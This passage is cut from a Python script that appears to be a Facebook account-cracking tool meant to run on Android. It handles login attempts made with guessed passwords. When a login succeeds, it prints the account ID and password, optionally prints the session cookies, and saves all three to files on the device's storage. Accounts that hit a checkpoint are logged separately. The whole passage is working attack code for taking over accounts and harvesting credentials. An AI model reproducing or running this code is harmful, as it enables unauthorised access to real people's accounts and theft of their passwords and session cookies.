                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SxR-OK] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SxR-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SxR-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                #print(f"\r\r {c}[SxR-CP] {uid} | {pww}")
                open('/sdcard/SxR-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass

sxr_main()
